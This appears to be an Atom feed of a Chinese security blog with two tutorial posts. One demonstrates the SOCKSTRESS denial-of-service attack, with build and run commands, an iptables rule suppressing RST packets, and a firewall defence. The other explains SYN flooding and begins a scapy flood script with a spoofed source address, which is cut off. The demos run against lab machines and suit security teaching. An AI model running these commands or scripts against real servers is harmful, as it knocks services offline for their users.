<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TimeS0ng&#39;s blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://TimeS0ng.github.io/"/>
  <updated>2017-09-23T12:55:12.000Z</updated>
  <id>http://TimeS0ng.github.io/</id>
  
  <author>
    <name>TimeS0ng</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SOCKSTRESS</title>
    <link href="http://TimeS0ng.github.io/2017/09/23/SOCKSTRESS/"/>
    <id>http://TimeS0ng.github.io/2017/09/23/SOCKSTRESS/</id>
    <published>2017-09-23T12:44:35.000Z</published>
    <updated>2017-09-23T12:55:12.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-SOCKSTRESS攻击简介"><a href="#0x00-SOCKSTRESS攻击简介" class="headerlink" title="0x00. SOCKSTRESS攻击简介"></a>0x00. SOCKSTRESS攻击简介</h2><h4 id="emsp-emsp-SockStress攻击正好与Syn-Flood攻击原理相悖，它正是利用建立TCP-IP三次握手连接来实现拒绝服务攻击，而且与Syn-Flood不同它并非通过耗尽服务器的TCP连接数来让正常用户的正常请求无法响应，而是直接耗尽服务端的内存、CPU等资源让受害者宕机，属于非对称的资源消耗攻击，这种攻击方式的危害性极大，而且一旦遭受分布式攻击是几乎不能被抵御的。"><a href="#emsp-emsp-SockStress攻击正好与Syn-Flood攻击原理相悖，它正是利用建立TCP-IP三次握手连接来实现拒绝服务攻击，而且与Syn-Flood不同它并非通过耗尽服务器的TCP连接数来让正常用户的正常请求无法响应，而是直接耗尽服务端的内存、CPU等资源让受害者宕机，属于非对称的资源消耗攻击，这种攻击方式的危害性极大，而且一旦遭受分布式攻击是几乎不能被抵御的。" class="headerlink" title="&emsp;&emsp;SockStress攻击正好与Syn-Flood攻击原理相悖，它正是利用建立TCP/IP三次握手连接来实现拒绝服务攻击，而且与Syn-Flood不同它并非通过耗尽服务器的TCP连接数来让正常用户的正常请求无法响应，而是直接耗尽服务端的内存、CPU等资源让受害者宕机，属于非对称的资源消耗攻击，这种攻击方式的危害性极大，而且一旦遭受分布式攻击是几乎不能被抵御的。"></a>&emsp;&emsp;SockStress攻击正好与Syn-Flood攻击原理相悖，它正是利用建立TCP/IP三次握手连接来实现拒绝服务攻击，而且与Syn-Flood不同它并非通过耗尽服务器的TCP连接数来让正常用户的正常请求无法响应，而是直接耗尽服务端的内存、CPU等资源让受害者宕机，属于非对称的资源消耗攻击，这种攻击方式的危害性极大，而且一旦遭受分布式攻击是几乎不能被抵御的。</h4><a id="more"></a>
<hr>
<h2 id="0x01-SOCKSTRESS攻击原理"><a href="#0x01-SOCKSTRESS攻击原理" class="headerlink" title="0x01. SOCKSTRESS攻击原理"></a>0x01. SOCKSTRESS攻击原理</h2><p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/WEBRESOURCE8d0ba39bc433eeb905b6ad6db08ee003/1559" alt="image"></p>
<h3 id="上篇文章已经给大家介绍过TCP-IP的握手过程了，所以这里就只讲一下SOCKSTRESS的攻击原理"><a href="#上篇文章已经给大家介绍过TCP-IP的握手过程了，所以这里就只讲一下SOCKSTRESS的攻击原理" class="headerlink" title="上篇文章已经给大家介绍过TCP/IP的握手过程了，所以这里就只讲一下SOCKSTRESS的攻击原理"></a>上篇文章已经给大家介绍过TCP/IP的握手过程了，所以这里就只讲一下SOCKSTRESS的攻击原理</h3><h4 id="emsp-emsp-1-首先，攻击者大量请求建立三次握手连接"><a href="#emsp-emsp-1-首先，攻击者大量请求建立三次握手连接" class="headerlink" title="&emsp;&emsp;1.首先，攻击者大量请求建立三次握手连接"></a>&emsp;&emsp;1.首先，攻击者大量请求建立三次握手连接</h4><h4 id="emsp-emsp-2-成功建立ESTABLISHED之后，攻击者会将数据包中window的值置为0（window的意思代表client这边一次可以接受的数据大小，置为0之后表示client没有window来接受server发来的数据，然后server就会分配内存来维持TCP连接直到client有空闲的window与之通信），然而攻击者可不会维持什么连接，他只会不断的请求TCP连接耗尽server的资源"><a href="#emsp-emsp-2-成功建立ESTABLISHED之后，攻击者会将数据包中window的值置为0（window的意思代表client这边一次可以接受的数据大小，置为0之后表示client没有window来接受server发来的数据，然后server就会分配内存来维持TCP连接直到client有空闲的window与之通信），然而攻击者可不会维持什么连接，他只会不断的请求TCP连接耗尽server的资源" class="headerlink" title="&emsp;&emsp;2.成功建立ESTABLISHED之后，攻击者会将数据包中window的值置为0（window的意思代表client这边一次可以接受的数据大小，置为0之后表示client没有window来接受server发来的数据，然后server就会分配内存来维持TCP连接直到client有空闲的window与之通信），然而攻击者可不会维持什么连接，他只会不断的请求TCP连接耗尽server的资源"></a>&emsp;&emsp;2.成功建立ESTABLISHED之后，攻击者会将数据包中window的值置为0（window的意思代表client这边一次可以接受的数据大小，置为0之后表示client没有window来接受server发来的数据，然后server就会分配内存来维持TCP连接直到client有空闲的window与之通信），然而攻击者可不会维持什么连接，他只会不断的请求TCP连接耗尽server的资源</h4><h4 id="emsp-emsp-3-当server这端维持连接达到一定数量之后，内存、CPU甚至是SWAP分区都会被耗尽，系统命令不能正常执行，想要恢复server唯一的办法就是断网"><a href="#emsp-emsp-3-当server这端维持连接达到一定数量之后，内存、CPU甚至是SWAP分区都会被耗尽，系统命令不能正常执行，想要恢复server唯一的办法就是断网" class="headerlink" title="&emsp;&emsp;3.当server这端维持连接达到一定数量之后，内存、CPU甚至是SWAP分区都会被耗尽，系统命令不能正常执行，想要恢复server唯一的办法就是断网"></a>&emsp;&emsp;3.当server这端维持连接达到一定数量之后，内存、CPU甚至是SWAP分区都会被耗尽，系统命令不能正常执行，想要恢复server唯一的办法就是断网</h4><h3 id="下面是attacker发向server的一个ACK包，window被置为了0"><a href="#下面是attacker发向server的一个ACK包，window被置为了0" class="headerlink" title="[*]下面是attacker发向server的一个ACK包，window被置为了0"></a>[*]下面是attacker发向server的一个ACK包，window被置为了0</h3><p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/3AA80062D00C4DB7BC40609FB312723E/1691" alt="image"></p>
<hr>
<h2 id="0x02-SOCKSTRESS攻击实战"><a href="#0x02-SOCKSTRESS攻击实战" class="headerlink" title="0x02. SOCKSTRESS攻击实战"></a>0x02. SOCKSTRESS攻击实战</h2><h4 id="emsp-emsp-这次的实战步骤比较简单，但是危害巨大，笔者会用自己的靶机演示，大家不要去攻击网络上的任何服务器。"><a href="#emsp-emsp-这次的实战步骤比较简单，但是危害巨大，笔者会用自己的靶机演示，大家不要去攻击网络上的任何服务器。" class="headerlink" title="&emsp;&emsp;这次的实战步骤比较简单，但是危害巨大，笔者会用自己的靶机演示，大家不要去攻击网络上的任何服务器。"></a>&emsp;&emsp;这次的实战步骤比较简单，但是危害巨大，笔者会用自己的靶机演示，大家不要去攻击网络上的任何服务器。</h4><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-SOCKSTRESS攻击脚本"><a href="#emsp-emsp-1-SOCKSTRESS攻击脚本" class="headerlink" title="&emsp;&emsp;1. SOCKSTRESS攻击脚本"></a>&emsp;&emsp;1. SOCKSTRESS攻击脚本</h4><h4 id="emsp-emsp-2-kali-linux"><a href="#emsp-emsp-2-kali-linux" class="headerlink" title="&emsp;&emsp;2. kali linux"></a>&emsp;&emsp;2. kali linux</h4><h4 id="emsp-emsp-3-metasploit靶机-IP-192-168-1-104"><a href="#emsp-emsp-3-metasploit靶机-IP-192-168-1-104" class="headerlink" title="&emsp;&emsp;3. metasploit靶机 IP=192.168.1.104"></a>&emsp;&emsp;3. metasploit靶机 IP=192.168.1.104</h4><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><h4 id="1-下载Github上面的SOCKSTRESS攻击脚本并安装"><a href="#1-下载Github上面的SOCKSTRESS攻击脚本并安装" class="headerlink" title="1.下载Github上面的SOCKSTRESS攻击脚本并安装"></a>1.下载Github上面的SOCKSTRESS攻击脚本并安装</h4><blockquote>
<p>git clone <a href="https://github.com/defuse/sockstress" target="_blank" rel="external">https://github.com/defuse/sockstress</a> &amp;&amp; cd sockstress/ &amp;&amp; make</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/BEC0232B6B914CE38A3331BCCBE51018/1612" alt="image"></p>
<h4 id="2-设置防火墙规则，过滤发送给server的REST包（不过滤的话server就会断开连接）"><a href="#2-设置防火墙规则，过滤发送给server的REST包（不过滤的话server就会断开连接）" class="headerlink" title="2.设置防火墙规则，过滤发送给server的REST包（不过滤的话server就会断开连接）"></a>2.设置防火墙规则，过滤发送给server的REST包（不过滤的话server就会断开连接）</h4><blockquote>
<p>iptables -A OUTPUT -p TCP –tcp-flags rst rst -d xx.xx.xx.xx -j DROP</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/406BA39543DB482FB7FBBEAF43381AE2/1627" alt="image"></p>
<h4 id="3-运行SOCKSTRESS攻击脚本，攻击靶机的80端口"><a href="#3-运行SOCKSTRESS攻击脚本，攻击靶机的80端口" class="headerlink" title="3.运行SOCKSTRESS攻击脚本，攻击靶机的80端口"></a>3.运行SOCKSTRESS攻击脚本，攻击靶机的80端口</h4><blockquote>
<p>./sockstress xx.xx.xx.xx:80 eth0 -p payloads/http -d 100</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/A6C4BCBC67454DCBB7C54DAD971815D8/1635" alt="image"></p>
<h4 id="4-查看一下靶机可以看到内存和CPU已经被耗得差不多了，靶机的web服务已经访问不了，如果再多攻击一会可能就直接宕机"><a href="#4-查看一下靶机可以看到内存和CPU已经被耗得差不多了，靶机的web服务已经访问不了，如果再多攻击一会可能就直接宕机" class="headerlink" title="4.查看一下靶机可以看到内存和CPU已经被耗得差不多了，靶机的web服务已经访问不了，如果再多攻击一会可能就直接宕机"></a>4.查看一下靶机可以看到内存和CPU已经被耗得差不多了，靶机的web服务已经访问不了，如果再多攻击一会可能就直接宕机</h4><p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/8E823BF4397E4832A5CD0610084DCFE8/1637" alt="image"></p>
<hr>
<h2 id="0x03-防御措施"><a href="#0x03-防御措施" class="headerlink" title="0x03. 防御措施"></a>0x03. 防御措施</h2><h3 id="emsp-emsp-对于SOCKSTRESS这种攻击方式我们可以设置防火墙规则，限制server在一定时间内与同一个IP建立TCP连接的数量，这样即使有大量的连接发过来也不会对server有太大的影响，但是这仅限于DoS，如果是DDoS的话那么就只有升级server的性能了"><a href="#emsp-emsp-对于SOCKSTRESS这种攻击方式我们可以设置防火墙规则，限制server在一定时间内与同一个IP建立TCP连接的数量，这样即使有大量的连接发过来也不会对server有太大的影响，但是这仅限于DoS，如果是DDoS的话那么就只有升级server的性能了" class="headerlink" title="&emsp;&emsp;对于SOCKSTRESS这种攻击方式我们可以设置防火墙规则，限制server在一定时间内与同一个IP建立TCP连接的数量，这样即使有大量的连接发过来也不会对server有太大的影响，但是这仅限于DoS，如果是DDoS的话那么就只有升级server的性能了"></a>&emsp;&emsp;对于SOCKSTRESS这种攻击方式我们可以设置防火墙规则，限制server在一定时间内与同一个IP建立TCP连接的数量，这样即使有大量的连接发过来也不会对server有太大的影响，但是这仅限于DoS，如果是DDoS的话那么就只有升级server的性能了</h3><blockquote>
<p>iptables -I INPUT -p tcp –dport 80 -m state –state NEW -m recent –set &amp;&amp; iptables -I INPUT -p tcp –dport 80 -m state –state NEW -m recent  –update –seconds 30 –hitcount 10 -j DROP</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/0fd8fe6989a486a029c4141abf5ebe4a/xmlnote/4EF59A94649B42AA8AF65632AEFC9EBC/1664" alt="image"></p>
<h4 id="可以看到由于我们设置了防火墙规则，一台kali对靶机的攻击效果微乎其微（因为30秒内server只与kali建立10个TCP连接），但是如果是DDoS那么结果也是可想而知。"><a href="#可以看到由于我们设置了防火墙规则，一台kali对靶机的攻击效果微乎其微（因为30秒内server只与kali建立10个TCP连接），但是如果是DDoS那么结果也是可想而知。" class="headerlink" title="可以看到由于我们设置了防火墙规则，一台kali对靶机的攻击效果微乎其微（因为30秒内server只与kali建立10个TCP连接），但是如果是DDoS那么结果也是可想而知。"></a>可以看到由于我们设置了防火墙规则，一台kali对靶机的攻击效果微乎其微（因为30秒内server只与kali建立10个TCP连接），但是如果是DDoS那么结果也是可想而知。</h4><hr>
<h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04. 结语"></a>0x04. 结语</h2><h4 id="emsp-emsp-不太懂安全的人会认为发布攻击方法是在破坏互联网的稳定性，但这实在是片面的态度，理解攻击原理才是防御攻击最好的方式。让笔者最后再引用一句SOCKSTRESS作者的话：Pretending-a-problem-doesn’t-exist-won’t-make-it-go-away"><a href="#emsp-emsp-不太懂安全的人会认为发布攻击方法是在破坏互联网的稳定性，但这实在是片面的态度，理解攻击原理才是防御攻击最好的方式。让笔者最后再引用一句SOCKSTRESS作者的话：Pretending-a-problem-doesn’t-exist-won’t-make-it-go-away" class="headerlink" title="&emsp;&emsp;不太懂安全的人会认为发布攻击方法是在破坏互联网的稳定性，但这实在是片面的态度，理解攻击原理才是防御攻击最好的方式。让笔者最后再引用一句SOCKSTRESS作者的话：Pretending a problem doesn’t exist won’t make it go away."></a>&emsp;&emsp;不太懂安全的人会认为发布攻击方法是在破坏互联网的稳定性，但这实在是片面的态度，理解攻击原理才是防御攻击最好的方式。让笔者最后再引用一句SOCKSTRESS作者的话：Pretending a problem doesn’t exist won’t make it go away.</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-SOCKSTRESS攻击简介&quot;&gt;&lt;a href=&quot;#0x00-SOCKSTRESS攻击简介&quot; class=&quot;headerlink&quot; title=&quot;0x00. SOCKSTRESS攻击简介&quot;&gt;&lt;/a&gt;0x00. SOCKSTRESS攻击简介&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-SockStress攻击正好与Syn-Flood攻击原理相悖，它正是利用建立TCP-IP三次握手连接来实现拒绝服务攻击，而且与Syn-Flood不同它并非通过耗尽服务器的TCP连接数来让正常用户的正常请求无法响应，而是直接耗尽服务端的内存、CPU等资源让受害者宕机，属于非对称的资源消耗攻击，这种攻击方式的危害性极大，而且一旦遭受分布式攻击是几乎不能被抵御的。&quot;&gt;&lt;a href=&quot;#emsp-emsp-SockStress攻击正好与Syn-Flood攻击原理相悖，它正是利用建立TCP-IP三次握手连接来实现拒绝服务攻击，而且与Syn-Flood不同它并非通过耗尽服务器的TCP连接数来让正常用户的正常请求无法响应，而是直接耗尽服务端的内存、CPU等资源让受害者宕机，属于非对称的资源消耗攻击，这种攻击方式的危害性极大，而且一旦遭受分布式攻击是几乎不能被抵御的。&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;SockStress攻击正好与Syn-Flood攻击原理相悖，它正是利用建立TCP/IP三次握手连接来实现拒绝服务攻击，而且与Syn-Flood不同它并非通过耗尽服务器的TCP连接数来让正常用户的正常请求无法响应，而是直接耗尽服务端的内存、CPU等资源让受害者宕机，属于非对称的资源消耗攻击，这种攻击方式的危害性极大，而且一旦遭受分布式攻击是几乎不能被抵御的。&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;SockStress攻击正好与Syn-Flood攻击原理相悖，它正是利用建立TCP/IP三次握手连接来实现拒绝服务攻击，而且与Syn-Flood不同它并非通过耗尽服务器的TCP连接数来让正常用户的正常请求无法响应，而是直接耗尽服务端的内存、CPU等资源让受害者宕机，属于非对称的资源消耗攻击，这种攻击方式的危害性极大，而且一旦遭受分布式攻击是几乎不能被抵御的。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Syn-Flood</title>
    <link href="http://TimeS0ng.github.io/2017/09/21/Syn-Flood/"/>
    <id>http://TimeS0ng.github.io/2017/09/21/Syn-Flood/</id>
    <published>2017-09-21T14:53:30.000Z</published>
    <updated>2017-09-21T14:59:47.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-Syn-Flood攻击简介"><a href="#0x00-Syn-Flood攻击简介" class="headerlink" title="0x00. Syn-Flood攻击简介"></a>0x00. Syn-Flood攻击简介</h2><h4 id="emsp-emsp-Syn-Flood-Attack是一种基于TCP-IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。"><a href="#emsp-emsp-Syn-Flood-Attack是一种基于TCP-IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。" class="headerlink" title="&emsp;&emsp;Syn-Flood Attack是一种基于TCP/IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。"></a>&emsp;&emsp;Syn-Flood Attack是一种基于TCP/IP协议的拒绝服务攻击，它会造成服务器TCP连接数达到最大上限，从而不能为新的用户的正常访问请求建立TCP连接，以此达到攻击目的。这种攻击方式危害巨大，不仅会让用户体验不佳，更直接的影响是对企业造成严重的经济损失！所以我们有必要了解这种攻击的原理和防御措施。</h4><a id="more"></a>
<hr>
<h2 id="0x01-TCP-IP三次握手"><a href="#0x01-TCP-IP三次握手" class="headerlink" title="0x01. TCP/IP三次握手"></a>0x01. TCP/IP三次握手</h2><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/WEBRESOURCE82141cc79b8be8e533232aadf09ffc3b/1390" alt="image"></p>
<h4 id="1-第一次握手：Client将标志位-也就是flags位-SYN置为1，随机产生一个值seq-J，并将该数据包发送给Server，Client进入SYN-SENT状态，等待Server确认。"><a href="#1-第一次握手：Client将标志位-也就是flags位-SYN置为1，随机产生一个值seq-J，并将该数据包发送给Server，Client进入SYN-SENT状态，等待Server确认。" class="headerlink" title="1.第一次握手：Client将标志位(也就是flags位)SYN置为1，随机产生一个值seq=J，并将该数据包发送给Server，Client进入SYN_SENT状态，等待Server确认。"></a>1.第一次握手：Client将标志位(也就是flags位)SYN置为1，随机产生一个值seq=J，并将该数据包发送给Server，Client进入SYN_SENT状态，等待Server确认。</h4><h4 id="2-第二次握手：Server收到数据包后由标志位SYN-1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack-J-1，随机产生一个值seq-K，并将该数据包发送给Client以确认连接请求，Server进入SYN-RCVD状态。"><a href="#2-第二次握手：Server收到数据包后由标志位SYN-1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack-J-1，随机产生一个值seq-K，并将该数据包发送给Client以确认连接请求，Server进入SYN-RCVD状态。" class="headerlink" title="2.第二次握手：Server收到数据包后由标志位SYN=1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给Client以确认连接请求，Server进入SYN_RCVD状态。"></a>2.第二次握手：Server收到数据包后由标志位SYN=1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给Client以确认连接请求，Server进入SYN_RCVD状态。</h4><h4 id="3-第三次握手：Client收到确认后，检查ack是否为J-1，ACK是否为1，如果正确则将标志位ACK置为1，ack-K-1，并将该数据包发送给Server，Server检查ack是否为K-1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。"><a href="#3-第三次握手：Client收到确认后，检查ack是否为J-1，ACK是否为1，如果正确则将标志位ACK置为1，ack-K-1，并将该数据包发送给Server，Server检查ack是否为K-1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。" class="headerlink" title="3.第三次握手：Client收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给Server，Server检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。"></a>3.第三次握手：Client收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给Server，Server检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。</h4><h4 id="下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1-读者们也可以自己抓包来分析包结构更好的学习。"><a href="#下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1-读者们也可以自己抓包来分析包结构更好的学习。" class="headerlink" title="[*]下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1,读者们也可以自己抓包来分析包结构更好的学习。"></a>[*]下面是笔者用Wireshark抓到的三次握手连接，可以看到FLAG位的SYN已经被set为1,读者们也可以自己抓包来分析包结构更好的学习。</h4><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/5AA8915F1F464491970B2512AD2C1325/1394" alt="image"></p>
<hr>
<h2 id="0x02-Syn-Flood攻击原理"><a href="#0x02-Syn-Flood攻击原理" class="headerlink" title="0x02. Syn-Flood攻击原理"></a>0x02. Syn-Flood攻击原理</h2><p><img src="http://note.youdao.com/yws/public/resource/eef34ae90ae1b5348713d552daec3c08/xmlnote/38040545EAD640A5B8D161A4EDB2E087/1407" alt="image"></p>
<h3 id="上图简要介绍了Syn-Flood攻击过程"><a href="#上图简要介绍了Syn-Flood攻击过程" class="headerlink" title="上图简要介绍了Syn-Flood攻击过程"></a>上图简要介绍了Syn-Flood攻击过程</h3><h4 id="1-攻击者先向目标机发送SYN包，请求建立TCP连接"><a href="#1-攻击者先向目标机发送SYN包，请求建立TCP连接" class="headerlink" title="1.攻击者先向目标机发送SYN包，请求建立TCP连接"></a>1.攻击者先向目标机发送SYN包，请求建立TCP连接</h4><h4 id="2-目标机接收到SYN包之后，便会进入SYN-RCVD状态，然后又给攻击者回一个SYN-ACK包"><a href="#2-目标机接收到SYN包之后，便会进入SYN-RCVD状态，然后又给攻击者回一个SYN-ACK包" class="headerlink" title="2.目标机接收到SYN包之后，便会进入SYN_RCVD状态，然后又给攻击者回一个SYN-ACK包"></a>2.目标机接收到SYN包之后，便会进入SYN_RCVD状态，然后又给攻击者回一个SYN-ACK包</h4><h4 id="3-如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN-RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了"><a href="#3-如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN-RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了" class="headerlink" title="3.如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN_RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了"></a>3.如果攻击者发送SYN包时用的是伪造IP地址，那么目标机发送的SYN-ACK就很可能不可达，得不到ACK来建立完整的三次握手连接，这时目标机就会保持SYN_RCVD状态直到timeout。想象一下，如果我们一直发送SYN包请求连接，但是又不和目标机器建立完整的TCP连接，一会大家看看我的攻击脚本就知道这是一件多么可怕的事了</h4><h4 id="4-如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包-为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦"><a href="#4-如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包-为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦" class="headerlink" title="4.如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包(为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦)"></a>4.如果攻击者用的是本主机真实的IP地址的话，那么攻击者接受到ACK之后正常情况下会回复一个RST包(为什么不是ACK呢，因为攻击时我们是用pyhton的scapy库来发包的，本地网卡并不认为自己发送了SYN包，莫名奇妙接收到一个SYN-ACK包当然会回复RST包啦)</h4><hr>
<h2 id="0x03-Syn-Flood攻击实战"><a href="#0x03-Syn-Flood攻击实战" class="headerlink" title="0x03. Syn-Flood攻击实战"></a>0x03. Syn-Flood攻击实战</h2><h4 id="emsp-emsp-有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。"><a href="#emsp-emsp-有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。" class="headerlink" title="&emsp;&emsp;有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。"></a>&emsp;&emsp;有了前面的理论基础，大家就能开心的做自己的测试了，就算遇到问题也能轻松的解决啦！所以理论还是很有用的，不要一味的只知道操作步骤而不知道原理。还有就是脚本什么的大家可以根据自己的理解来编写，不一定要用我的蹩脚的代码。</h4><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-Syn-Flood脚本"><a href="#emsp-emsp-1-Syn-Flood脚本" class="headerlink" title="&emsp;&emsp;1.Syn-Flood脚本"></a>&emsp;&emsp;1.Syn-Flood脚本</h4><h4 id="emsp-emsp-2-Wireshark抓包工具"><a href="#emsp-emsp-2-Wireshark抓包工具" class="headerlink" title="&emsp;&emsp;2.Wireshark抓包工具"></a>&emsp;&emsp;2.Wireshark抓包工具</h4><h4 id="emsp-emsp-3-metaploitable2-0-linux-emsp-IP-192-168-43-109"><a href="#emsp-emsp-3-metaploitable2-0-linux-emsp-IP-192-168-43-109" class="headerlink" title="&emsp;&emsp;3.metaploitable2.0-linux &emsp;IP=192.168.43.109"></a>&emsp;&emsp;3.metaploitable2.0-linux &emsp;IP=192.168.43.109</h4><h4 id="Syn-Flood脚本如下（注意：该脚本需要python-2-7版本，还需要安装scapy、threading、random库）："><a href="#Syn-Flood脚本如下（注意：该脚本需要python-2-7版本，还需要安装scapy、threading、random库）：" class="headerlink" title="Syn-Flood脚本如下（注意：该脚本需要python 2.7版本，还需要安装scapy、threading、random库）："></a>Syn-Flood脚本如下（注意：该脚本需要python 2.7版本，还需要安装scapy、threading、random库）：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Syn_flood</span><span class="params">(target_ip, target_port)</span>:</span></div><div class="line"> 	<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line"> 		port = random.randint(<span class="number">0</span>,<span class="number">10000</span>)</div><div class="line"> 		send(IP(src=<span class="string">"1.1.1.1"</span>, dst=target_ip)/TCP(dport=target_port, sport=port),verbose=<span class="number">0</span>)</div><div class="line"> 		<span class="comment">#send(IP(dst=target_ip)/TCP(dport=target_port, sport=port),verbose=0)</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(target_ip, target_port, threads)</span>:</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"BEGIN TO ATTACK TARGET"</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, threads):</div><div class="line">		<span class="comment">#print "test" </span></div><div 